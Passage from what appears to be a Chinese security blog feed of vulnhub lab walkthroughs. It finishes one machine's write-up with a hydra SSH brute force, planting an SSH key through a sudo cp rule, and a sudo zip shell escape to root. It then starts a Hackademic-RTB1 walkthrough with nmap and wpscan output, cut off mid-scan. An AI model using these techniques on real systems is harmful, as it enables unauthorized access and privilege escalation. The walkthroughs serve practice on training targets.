<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cewl http://192.168.142.131/ -w dict1.txt</span></span><br><span class="line">CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line">root@kali:~<span class="comment"># cat dict1.txt </span></span><br><span class="line">Dhanush</span><br><span class="line">धनष</span><br><span class="line">Lord</span><br><span class="line">Feature</span><br><span class="line">Wielded</span><br><span class="line">the</span><br><span class="line">यद</span><br><span class="line">यग</span><br><span class="line">Arjuna</span><br><span class="line">was</span><br><span class="line">able</span><br><span class="line">his</span><br><span class="line">and</span><br><span class="line">Then</span><br><span class="line">path</span><br><span class="line">The</span><br><span class="line">Header</span><br><span class="line">लनर</span><br><span class="line">भवत</span><br><span class="line">भरत</span><br><span class="line">यत</span><br><span class="line">थनमधर</span><br><span class="line">तदत</span><br><span class="line">मन</span><br><span class="line">सजम</span><br><span class="line">यहम</span><br><span class="line">परत</span><br><span class="line">रणय</span><br><span class="line">सधन</span><br><span class="line">वनशय</span><br><span class="line">दष</span><br><span class="line">कतम</span><br><span class="line">मसस</span><br><span class="line">थपनर</span><br><span class="line">थय</span><br><span class="line">भवम</span><br><span class="line">What</span><br><span class="line">Banner</span><br><span class="line">Dhanushधनष</span><br><span class="line">Weapon</span><br><span class="line"><span class="keyword">for</span></span><br><span class="line">shooting</span><br><span class="line">arrows</span><br><span class="line">typically</span><br><span class="line">made</span><br><span class="line">curved</span><br><span class="line">piece</span><br><span class="line">wood</span><br><span class="line">joined</span><br><span class="line">both</span><br><span class="line">ends</span><br><span class="line">Taut</span><br><span class="line">String</span><br><span class="line">दनय</span><br><span class="line">सबस</span><br><span class="line">तशल</span><br><span class="line">धनषWorld</span><br><span class="line">Most</span><br><span class="line">Powerful</span><br><span class="line">Dhanushs</span><br><span class="line">Sharang</span><br><span class="line">Dhanushसरग</span><br><span class="line">Vishnu</span><br><span class="line">Made</span><br><span class="line">Viswakarma</span><br><span class="line">Pinak</span><br><span class="line">Dhanushपनक</span><br><span class="line">ShivaMade</span><br><span class="line">pinak</span><br><span class="line">Gandiv</span><br><span class="line">Dhanushगण</span><br><span class="line">डव</span><br><span class="line">ArjunaMade</span><br><span class="line">Brahma</span><br><span class="line">Portfolio</span><br><span class="line">Choose</span><br><span class="line">Yoursअपन</span><br><span class="line">चन</span><br><span class="line">Heat</span><br><span class="line">Mahabharata</span><br><span class="line">not</span><br><span class="line">lift</span><br><span class="line">against</span><br><span class="line">Family</span><br><span class="line">Gurus</span><br><span class="line">Krishna</span><br><span class="line">tells</span><br><span class="line">him</span><br><span class="line">this</span><br><span class="line">Dhram</span><br><span class="line">Eternal</span><br><span class="line">Truth</span><br><span class="line">war</span><br><span class="line">You</span><br><span class="line">CTF</span><br><span class="line">Warrior</span><br><span class="line">Pick</span><br><span class="line">your</span><br><span class="line">attain</span><br><span class="line">Boot</span><br><span class="line">Hacking</span><br><span class="line">Articles</span><br><span class="line">All</span><br><span class="line">rights</span><br><span class="line">reserved</span><br><span class="line">Scripts</span><br><span class="line">Raj</span><br><span class="line">Aarti</span><br><span class="line">Geet</span><br><span class="line">Yashika</span><br><span class="line">Kavish</span><br><span class="line">Rishab</span><br><span class="line">Japneet</span><br><span class="line">Pavan</span><br></pre></td></tr></table></figure>

<h3 id="爆破ssh的用户名和密码"><a href="#爆破ssh的用户名和密码" class="headerlink" title="爆破ssh的用户名和密码"></a>爆破ssh的用户名和密码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -L dict1.txt -P dict1.txt ssh://192.168.142.131 -s 65345 -I -e nsr -f</span></span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-12-17 22:03:33</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 13338 login tries (l:114/p:117), ~834 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.142.131:65345/</span><br><span class="line">[STATUS] 214.00 tries/min, 214 tries <span class="keyword">in</span> 00:01h, 13127 to <span class="keyword">do</span> <span class="keyword">in</span> 01:02h, 16 active</span><br><span class="line">[STATUS] 149.67 tries/min, 449 tries <span class="keyword">in</span> 00:03h, 12892 to <span class="keyword">do</span> <span class="keyword">in</span> 01:27h, 16 active</span><br><span class="line">[STATUS] 154.14 tries/min, 1079 tries <span class="keyword">in</span> 00:07h, 12262 to <span class="keyword">do</span> <span class="keyword">in</span> 01:20h, 16 active</span><br><span class="line">[STATUS] 154.67 tries/min, 2320 tries <span class="keyword">in</span> 00:15h, 11024 to <span class="keyword">do</span> <span class="keyword">in</span> 01:12h, 16 active</span><br><span class="line"></span><br><span class="line">[STATUS] 151.68 tries/min, 4702 tries <span class="keyword">in</span> 00:31h, 8643 to <span class="keyword">do</span> <span class="keyword">in</span> 00:57h, 16 active</span><br><span class="line">[STATUS] 151.43 tries/min, 7117 tries <span class="keyword">in</span> 00:47h, 6229 to <span class="keyword">do</span> <span class="keyword">in</span> 00:42h, 16 active</span><br><span class="line">[65345][ssh] host: 192.168.142.131   login: pinak   password: Gandiv</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> 192.168.142.131 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-12-17 22:56:20</span><br></pre></td></tr></table></figure>

<ul>
<li>用户名/密码  ——  pinak/Gandiv</li>
</ul>
<p>现在有了SSH的登录凭据，pinak/Gandiv登录并进行查看。 运行sudo -l命令检查sudoers列表，发现有效的cp命令以sarang用户身份运行，没有任何密码，因此可以使用它。 看一下用户sarang。 在sarang的主目录中，看到一个标记为“ .ssh”的隐藏目录。 试图打开它，但受到限制。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh pinak@192.168.142.131 -p 65345</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;[192.168.142.131]:65345 ([192.168.142.131]:65345)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:QVJEE1sfL5RUI7RaUefp0Cr9woMla1AyMzYAY683i5s.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[192.168.142.131]:65345<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">pinak@192.168.142.131&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">Last login: Fri Nov  8 09:05:56 2019</span><br><span class="line">pinak@ubuntu:~$ id</span><br><span class="line">uid=1001(pinak) gid=1001(pinak) groups=1001(pinak)</span><br><span class="line">pinak@ubuntu:~$ whoami</span><br><span class="line">pinak</span><br><span class="line">pinak@ubuntu:~$ </span><br><span class="line">pinak@ubuntu:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/pinak</span><br><span class="line">pinak@ubuntu:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> pinak on ubuntu:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User pinak may run the following commands on ubuntu:</span><br><span class="line">    (sarang) NOPASSWD: /bin/cp</span><br><span class="line">pinak@ubuntu:~$ <span class="built_in">cd</span> /home/sarang</span><br><span class="line">pinak@ubuntu:/home/sarang$ ls -la</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 4 sarang sarang 4096 Nov  8 08:03 .</span><br><span class="line">drwxr-xr-x 5 root   root   4096 Nov  7 21:01 ..</span><br><span class="line">-rw------- 1 sarang sarang    1 Nov  8 09:07 .bash_history</span><br><span class="line">-rw-r--r-- 1 sarang sarang  220 Nov  7 21:01 .bash_logout</span><br><span class="line">-rw-r--r-- 1 sarang sarang 3771 Nov  7 21:01 .bashrc</span><br><span class="line">drwx------ 2 sarang sarang 4096 Nov  7 21:07 .cache</span><br><span class="line">-rw-r--r-- 1 sarang sarang  807 Nov  7 21:01 .profile</span><br><span class="line">drwx------ 2 sarang sarang 4096 Nov  7 21:35 .ssh</span><br><span class="line">pinak@ubuntu:/home/sarang$ <span class="built_in">cd</span> .ssh</span><br><span class="line">-bash: <span class="built_in">cd</span>: .ssh: Permission denied</span><br></pre></td></tr></table></figure>

<p>使用cp命令进入sarang用户。 需要将ssh密钥显示在sarang用户主目录内的.ssh目录中。 尽管该文件只能读取，但可以使用cp命令在该目录中发送密钥。 为此，首先需要生成这些密钥。 为此使用ssh-keygen。 使用ssh-keygen后，进入pinak用户主目录内的.ssh目录中以找到id_rsa公钥。 给它适当的权限。 并将其移动到pinak用户主目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pinak@ubuntu:~$ ssh-keygen</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/pinak/.ssh/id_rsa): </span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /home/pinak/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /home/pinak/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:M3EjxpbK4Ni6vFhkYjtaUWnV7IRl6gK/2ab8B3FLz+U pinak@ubuntu</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 2048]----+</span></span><br><span class="line"><span class="string">|      .=o        |</span></span><br><span class="line"><span class="string">|     o.++.       |</span></span><br><span class="line"><span class="string">|  . = .oB o      |</span></span><br><span class="line"><span class="string">|   O +.+++ ..    |</span></span><br><span class="line"><span class="string">|..= = ++S+ o     |</span></span><br><span class="line"><span class="string">|.+.o =. .oo E    |</span></span><br><span class="line"><span class="string">| o+ o o.         |</span></span><br><span class="line"><span class="string">|.=.o o  .        |</span></span><br><span class="line"><span class="string">|o +.o...         |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">pinak@ubuntu:~$ cd .ssh</span></span><br><span class="line"><span class="string">pinak@ubuntu:~/.ssh$ ls</span></span><br><span class="line"><span class="string">id_rsa  id_rsa.pub</span></span><br><span class="line"><span class="string">pinak@ubuntu:~/.ssh$ chmod 777 id_rsa.pub</span></span><br><span class="line"><span class="string">pinak@ubuntu:~/.ssh$ cp id_rsa.pub /home/pinak</span></span><br><span class="line"><span class="string">pinak@ubuntu:~/.ssh$ cd ..</span></span><br><span class="line"><span class="string">pinak@ubuntu:~$ ls</span></span><br><span class="line"><span class="string">id_rsa.pub</span></span><br></pre></td></tr></table></figure>

<p>现在已经转移了公钥，现在使用cp命令作为sarang用户在sarang用户主目录中的.ssh目录中复制公钥了。 需要将sudo与cp命令一起使用，并提供源目录和目标目录。 完成此操作后，只需要使用刚转让的密钥以sarang身份登录即可。 可以看到它运行良好。 以成功的用户身份登录后，再次运行sudo -l命令，因为该用户不是root用户，目标是获得root用户。 看到zip命令具有sudo权限，可滥用该权限来升级此计算机上的特权。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pinak@ubuntu:~$ sudo -u sarang /bin/cp ./id_rsa.pub /home/sarang/.ssh/authorized_keys</span><br><span class="line">pinak@ubuntu:~$ ssh sarang@127.0.0.1 -i /.ssh/authorized_keys -p 65345</span><br><span class="line">Warning: Identity file /.ssh/authorized_keys not accessible: No such file or directory.</span><br><span class="line">The authenticity of host <span class="string">&#x27;[127.0.0.1]:65345 ([127.0.0.1]:65345)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:QVJEE1sfL5RUI7RaUefp0Cr9woMla1AyMzYAY683i5s.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[127.0.0.1]:65345<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/home/pinak/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Thu Nov  7 21:35:24 2019 from 192.168.0.100</span></span><br><span class="line"><span class="string">sarang@ubuntu:~$ sudo -l</span></span><br><span class="line"><span class="string">Matching Defaults entries for sarang on ubuntu:</span></span><br><span class="line"><span class="string">    env_reset, mail_badpass,</span></span><br><span class="line"><span class="string">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User sarang may run the following commands on ubuntu:</span></span><br><span class="line"><span class="string">    (root) NOPASSWD: /usr/bin/zip</span></span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>使用最近通过ssh登录的用户sarang。 使用sudo命令列出用户可以使用root特权运行的所有命令，可以看到用户可以以root用户身份运行zip命令，而无需输入任何密码。<br>因此，现在正在将权限从“sarang”提升到“root”。 创建一个文件“lucifer11”，然后执行命令：首先将文件“lucifer11”压缩，然后将其移动到/tmp/lucifer11.zip文件夹，最后解压缩，然后弹出root的shell，提权成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sarang@ubuntu:~$ touch lucifer11</span><br><span class="line">sarang@ubuntu:~$ ls</span><br><span class="line">lucifer11</span><br><span class="line">sarang@ubuntu:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/sarang</span><br><span class="line">sarang@ubuntu:~$ sudo zip /tmp/lucifer11.zip /home/sarang/lucifer11 -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br><span class="line">  adding: home/sarang/lucifer11 (stored 0%)</span><br><span class="line">root@ubuntu:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@ubuntu:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>这次提权方式太帅，记下来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo zip /tmp/lucifer11.zip /home/sarang/lucifer11 -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure>

<p>获取flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># cd /root</span></span><br><span class="line">root@ubuntu:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@ubuntu:/root<span class="comment"># cat flag.txt </span></span><br><span class="line">          </span><br><span class="line">                                            @p</span><br><span class="line">                                           @@@.</span><br><span class="line">                                          @@@@@</span><br><span class="line">                                         @@@@@@@</span><br><span class="line">                                        *<span class="string">&quot;`]@P ^^</span></span><br><span class="line"><span class="string">                                           ]@P</span></span><br><span class="line"><span class="string">                                           ]@P</span></span><br><span class="line"><span class="string">                               ,,,,        ]@P       ,,gg,,</span></span><br><span class="line"><span class="string">                           g@@@@@@@@@b     ]@P    ,@@@@@@@@@@g,</span></span><br><span class="line"><span class="string">                        ,@@@@@@BNPPNB@@@@@@@@@@@@@@@@P**PNB@@@@@w</span></span><br><span class="line"><span class="string">                      g@@@@P^`        %NNNNN@NNNNNP          *B@@@g</span></span><br><span class="line"><span class="string">                    g@@@P`                 -@                   &quot;</span>B@@w</span><br><span class="line">                  ,@@@`                    ]@                      %@@,</span><br><span class="line">                 @@P-                      ]@                        *@@,</span><br><span class="line">              ,@@<span class="string">&quot;                         ]@                          *B@</span></span><br><span class="line"><span class="string">            ,@N&quot;</span>                          y@@B                            %@,</span><br><span class="line">      ,,  g@P-                            ]@@@P                             *Bg ,gg</span><br><span class="line">      @@@@$,,,,,,,,,,,,,,,,,,,,,,,,,,ggggg@@@@wwwwwwwwwgggggggggww==========mm4NNN<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">!! Congrats you have finished this task !!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Contact us here:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hacking Articles : https://twitter.com/rajchandel/</span></span><br><span class="line"><span class="string">Nisha Sharma     : https://in.linkedin.com/in/nishasharmaa</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+-+-+-+-+-+ +-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string"> |E|n|j|o|y| |H|A|C|K|I|N|G|</span></span><br><span class="line"><span class="string"> +-+-+-+-+-+ +-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">____________________________________</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub67.jpg"></p>
<p>Flag太帅，犹如利剑正中敌人心脏！！！然后狠狠穿透！！！</p>
<p><font color="red">Key:网页用户名收集，hydra爆破,ssh公钥滥用,/usr/bin/zip,/bin/cp的无需root密码的权限滥用。</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Hackademic-RTB1]</title>
    <url>/2019/12/11/Hackademic-RTB1/</url>
    <content><![CDATA[<p>名称：Hackademic：RTB1<br>发布日期：2011年9月6日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrYWRlbWljL0hhY2thZGVtaWMuUlRCMS56aXA=">https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrYWRlbWljL0hhY2thZGVtaWMuUlRCMS56aXAudG9ycmVudA==">https://download.vulnhub.com/hackademic/Hackademic.RTB1.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>这是mr.pr0n提出的第一个现实性黑客攻击挑战<br>下载目标并获得root。<br>尝试读取根目录中文件“ key.txt”的内容。<br>请享用！</p>
<p>漏洞：</p>
<ul>
<li>纯文本密码</li>
<li>提权</li>
<li>重用凭证</li>
<li>SQL注入</li>
<li>不受限制地上传危险类型的文件</li>
</ul>
<p>靶机打开界面</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub37.jpg"></p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -v 192.168.84.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.140</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 00:0C:29:01:8A:4D (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sS -Pn -T4 --script=vuln 192.168.84.140</span></span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE VERSION</span><br><span class="line">22/tcp closed ssh</span><br><span class="line">80/tcp open   http    Apache httpd 2.2.15 ((Fedora))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /icons/: Potentially interesting folder w/ directory listing</span><br><span class="line">|_http-server-header: Apache/2.2.15 (Fedora)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-trace: TRACE is enabled</span></span><br><span class="line"><span class="string">| http-vuln-cve2011-3192: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Apache byterange filter DoS</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  BID:49303  CVE:CVE-2011-3192</span></span><br><span class="line"><span class="string">|       The Apache web server is vulnerable to a denial of service attack when numerous</span></span><br><span class="line"><span class="string">|       overlapping byte ranges are requested.</span></span><br><span class="line"><span class="string">|     Disclosure date: 2011-08-19</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://www.tenable.com/plugins/nessus/55976</span></span><br><span class="line"><span class="string">|       https://www.securityfocus.com/bid/49303</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</span></span><br><span class="line"><span class="string">|_      https://seclists.org/fulldisclosure/2011/Aug/175</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.2.15: </span></span><br><span class="line"><span class="string">|       CVE-2011-3192   7.8     https://vulners.com/cve/CVE-2011-3192</span></span><br><span class="line"><span class="string">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span></span><br><span class="line"><span class="string">|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668</span></span><br><span class="line"><span class="string">|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169</span></span><br><span class="line"><span class="string">|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167</span></span><br><span class="line"><span class="string">|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249</span></span><br><span class="line"><span class="string">|       CVE-2012-0883   6.9     https://vulners.com/cve/CVE-2012-0883</span></span><br><span class="line"><span class="string">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span></span><br><span class="line"><span class="string">|       CVE-2017-12171  6.4     https://vulners.com/cve/CVE-2017-12171</span></span><br><span class="line"><span class="string">|       CVE-2013-1862   5.1     https://vulners.com/cve/CVE-2013-1862</span></span><br><span class="line"><span class="string">|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231</span></span><br><span class="line"><span class="string">|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098</span></span><br><span class="line"><span class="string">|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438</span></span><br><span class="line"><span class="string">|       CVE-2012-4557   5.0     https://vulners.com/cve/CVE-2012-4557</span></span><br><span class="line"><span class="string">|       CVE-2011-3368   5.0     https://vulners.com/cve/CVE-2011-3368</span></span><br><span class="line"><span class="string">|       CVE-2010-2068   5.0     https://vulners.com/cve/CVE-2010-2068</span></span><br><span class="line"><span class="string">|       CVE-2010-1452   5.0     https://vulners.com/cve/CVE-2010-1452</span></span><br><span class="line"><span class="string">|       CVE-2012-0031   4.6     https://vulners.com/cve/CVE-2012-0031</span></span><br><span class="line"><span class="string">|       CVE-2011-3607   4.4     https://vulners.com/cve/CVE-2011-3607</span></span><br><span class="line"><span class="string">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span></span><br><span class="line"><span class="string">|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896</span></span><br><span class="line"><span class="string">|       CVE-2012-4558   4.3     https://vulners.com/cve/CVE-2012-4558</span></span><br><span class="line"><span class="string">|       CVE-2012-3499   4.3     https://vulners.com/cve/CVE-2012-3499</span></span><br><span class="line"><span class="string">|       CVE-2012-0053   4.3     https://vulners.com/cve/CVE-2012-0053</span></span><br><span class="line"><span class="string">|       CVE-2011-4317   4.3     https://vulners.com/cve/CVE-2011-4317</span></span><br><span class="line"><span class="string">|       CVE-2011-3639   4.3     https://vulners.com/cve/CVE-2011-3639</span></span><br><span class="line"><span class="string">|       CVE-2011-3348   4.3     https://vulners.com/cve/CVE-2011-3348</span></span><br><span class="line"><span class="string">|       CVE-2011-0419   4.3     https://vulners.com/cve/CVE-2011-0419</span></span><br><span class="line"><span class="string">|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span></span><br><span class="line"><span class="string">|       CVE-2012-2687   2.6     https://vulners.com/cve/CVE-2012-2687</span></span><br><span class="line"><span class="string">|_      CVE-2011-4415   1.2     https://vulners.com/cve/CVE-2011-4415</span></span><br></pre></td></tr></table></figure>

<p>打开发现是wordpress的，直接上wpscan</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://192.168.84.140/Hackademic_RTB1/</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.5</span></span><br><span class="line"><span class="string">                               </span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Updating the Database ...</span></span><br><span class="line"><span class="string">[i] Update completed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: http://192.168.84.140/Hackademic_RTB1/</span></span><br><span class="line"><span class="string">[+] Started: Tue Dec 10 21:58:17 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.84.140/Hackademic_RTB1/</span></span><br><span class="line"><span class="string"> | Interesting Entries:</span></span><br><span class="line"><span class="string"> |  - Server: Apache/2.2.15 (Fedora)</span></span><br><span class="line"><span class="string"> |  - X-Powered-By: PHP/5.3.3</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.84.140/Hackademic_RTB1/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 1.5.1.1 identified (Insecure, released on 2007-09-24).</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.84.140/Hackademic_RTB1/?feed=rss2, &lt;!-- generator=&quot;wordpress/1.5.1.1&quot; --&gt;</span></span><br><span class="line"><span class="string"> |  - http://192.168.84.140/Hackademic_RTB1/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=1.5.1.1&lt;/generator&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: starburst</span></span><br><span class="line"><span class="string"> | Location: http://192.168.84.140/Hackademic_RTB1/wp-content/themes/starburst/</span></span><br><span class="line"><span class="string"> | Latest Version: 1.1 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2008-09-15T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.84.140/Hackademic_RTB1/wp-content/themes/starburst/style.css</span></span><br><span class="line"><span class="string"> | Style Name: Starburst</span></span><br><span class="line"><span class="string"> | Style URI: http://starburst.weirdncrazy.com</span></span><br><span class="line"><span class="string"> | Description: A WordPress 1.5/2....</span></span><br><span class="line"><span class="string"> | Author: Claire</span></span><br><span 